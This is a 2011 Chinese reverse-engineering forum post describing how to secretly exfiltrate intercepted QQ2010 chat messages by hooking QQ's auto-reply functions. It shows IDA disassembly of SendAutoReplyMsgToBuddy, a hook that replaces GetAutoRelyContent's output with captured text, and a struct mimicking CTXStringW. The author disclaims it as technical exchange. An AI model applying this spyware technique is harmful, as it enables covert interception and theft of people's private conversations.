
# 暗度陈仓，实现 QQ 暗中给自己发消息

> 原文：[`www.pediy.com/kssd/pediy12/130432.html`](https://www.pediy.com/kssd/pediy12/130432.html)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*标题:【原创】暗度陈仓，实现 qq 暗中给自己发消息 \*

\*作者:踏雪流云 \*

\*日期:2011 年 3 月 6 号 \*

\*声明:本文章的目的仅为技术交流讨论 \*

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

此文章，是针对《逆向 qqspy，实现 qq2010 聊天信息获取》文章的深一步研究；可以实现将获取到的聊天信息暗中发给自己，神不知鬼不觉；其实，早在四个多月前，就已经实现了这个方法，但始终觉得此技术具有一定的危险性，怕被不法使用，才迟迟没有发表；但现在我更加觉得，如果不分享此技术，它就会烂在手里，也有点可惜；因此，希望看到此文的朋友，以技术交流为目的，不要窥视他人隐私。

好了，言归正传。

此方法是基于《逆向 qqspy，实现 qq2010 聊天信息获取》的，如果您还没有看过那篇文章，请 google 之。

首先，依旧是 `Hook_SaveMsg`，获取到对方的 qq 消息。

然后，是将获得的 qq 消息，暗中发给自己，这也是本文的关键；我采用的方法是利用 `AppUtil.dll` 中的 `long __cdecl Util::ChatSession::SendAutoReplyMsgToBuddy(unsigned long dstQQ)` 函数，一看函数名我们就能猜到这个是用来发送自动回复消息给对方的一个接口，参数很简单，就是对方的 qq 号码。

好了，有了这个函数，我们如何将自定的消息发给自己呢？看此函数的部分代码：

```
.text:61223210 ; long __cdecl Util::ChatSession::SendAutoReplyMsgToBuddy(unsigned long)
.text:61223210                     public ?SendAutoReplyMsgToBuddy@ChatSession@Util@@YAJK@Z
.text:61223210 ?SendAutoReplyMsgToBuddy@ChatSession@Util@@YAJK@Z proc near
.text:61223210                                             ; DATA XREF: .rdata:off_612D0D88o
.text:61223210
.text:61223210 var_A4               = dword ptr -0A4h
.text:61223210 var_A0               = dword ptr -0A0h
.text:61223210 var_9C               = dword ptr -9Ch
.text:61223210 var_98               = dword ptr -98h
.text:61223210 var_94               = byte ptr -94h
.text:61223210 var_90               = byte ptr -90h
.text:61223210 var_8C               = dword ptr -8Ch
.text:61223210 var_88               = dword ptr -88h
.text:61223210 var_84               = dword ptr -84h
.text:61223210 msgpack              = dword ptr -80h
.text:61223210 var_7C               = dword ptr -7Ch
.text:61223210 var_78               = dword ptr -78h
.text:61223210 var_74               = dword ptr -74h
.text:61223210 var_70               = dword ptr -70h
.text:61223210 var_6C               = byte ptr -6Ch
.text:61223210 var_64               = dword ptr -64h
.text:61223210 var_60               = dword ptr -60h
.text:61223210 var_58               = dword ptr -58h
.text:61223210 var_54               = dword ptr -54h
.text:61223210 var_10               = dword ptr -10h
.text:61223210 var_C                = dword ptr -0Ch
.text:61223210 var_4                = dword ptr -4
.text:61223210 arg_0                = dword ptr  8
.text:61223210
.text:61223210                     push    ebp
.text:61223211                     mov     ebp, esp
.text:61223213                     push    0FFFFFFFFh
.text:61223215                     push    offset loc_6128C0F9
.text:6122321A                     mov     eax, large fs:0
.text:61223220                     push    eax
.text:61223221                     sub     esp, 98h
.text:61223227                     mov     eax, dword_612DFCA0
.text:6122322C                     xor     eax, ebp
.text:6122322E                     mov     [ebp+var_10], eax
.text:61223231                     push    ebx
.text:61223232                     push    esi
.text:61223233                     push    edi
.text:61223234                     push    eax
.text:61223235                     lea     eax, [ebp+var_C]
.text:61223238                     mov     large fs:0, eax
.text:6122323E                     mov     edi, [ebp+arg_0]
.text:61223241                     push    edi
.text:61223242                     mov     esi, 1
.text:61223247                     call    ?IsQInterLiveUser@QInterLive@Contact@Util@@YAHK@Z ; Util::Contact::QInterLive::IsQInterLiveUser(ulong)
.text:6122324C                     add     esp, 4
.text:6122324F                     test    eax, eax
.text:61223251                     jz      short loc_61223259
.text:61223253                     xor     ebx, ebx
.text:61223255                     xor     esi, esi
.text:61223257                     jmp     short loc_6122326B
.text:61223259 ; ---------------------------------------------------------------
.text:61223259
.text:61223259 loc_61223259:                   ; CODE XREF: Util::ChatSession::SendAutoReplyMsgToBuddy(ulong)+41j
.text:61223259                     push    edi
.text:6122325A                     call    ds:?IsInvisible@Contact@Util@@YAHK@Z ; Util::Contact::IsInvisible(ulong)
.text:61223260                     add     esp, 4
.text:61223263                     test    eax, eax
.text:61223265                     jz      short loc_61223269
.text:61223267                     xor     esi, esi
.text:61223269
.text:61223269 loc_61223269:                   ; CODE XREF: Util::ChatSession::SendAutoReplyMsgToBuddy(ulong)+55j
.text:61223269                     xor     ebx, ebx
.text:6122326B
.text:6122326B loc_6122326B:                   ; CODE XREF: Util::ChatSession::SendAutoReplyMsgToBuddy(ulong)+47j
.text:6122326B                     lea     ecx, [ebp+var_94]
.text:61223271                     call    ds:??0CTXStringW@@QAE@XZ ; CTXStringW::CTXStringW(void)
.text:61223277                     cmp     esi, ebx
.text:61223279                     mov     [ebp+var_4], ebx
.text:6122327C                     jz      loc_61223718
.text:61223282                     lea     eax, [ebp+var_94]
.text:61223288                     push    eax
.text:61223289                     call    ?GetAutoRelyContent@Self@Contact@Util@@YAHAAVCTXStringW@@@Z ; Util::Contact::Self::GetAutoRelyContent(CTXStringW &)
.text:6122328E                     add     esp, 4
```

它会主动调用 `Util::Contact::Self::GetAutoRelyContent(CTXStringW &)` 函数，来获取自动回复的内容。

接着，当然是 Hook `GetAutoRelyContent` 函数了，让它返回我们要求它发的内容，代码如下：

```
int Hook_GetAutoRelyContent(char ** pmsg)
{
  if(bIsSending)
  {
    *pmsg=(char *)MyMsg.str;
    return 1;
  }

  ChookGetAutoRelyContentKey->HookStatus(FALSE);
  int res=GetAutoStr(pmsg);
  ChookGetAutoRelyContentKey->HookStatus(TRUE);
  return res;
}
```

这个函数传入的是 `CTXStringW` 字符串类的引用，为了简单起见，我使用了一个结构体来模拟它的成员变量，结构体如下：

```
typedef struct CTXBSTR{
  int zero;//貌似要一直是 0
  int count;//引用计数
  int len1;
  int len2;
  wchar_t str[1024];
}TXStr,* pTXStr;
```

好了，利用这两个函数，就可以实现通过 qq 将聊天信息暗中发给对方了；原理是不是很简单，呵呵～～～

源代码如下（VC8.0 编译通过,测试环境 QQ2010 SP1(1761)）：

`im32.rar`
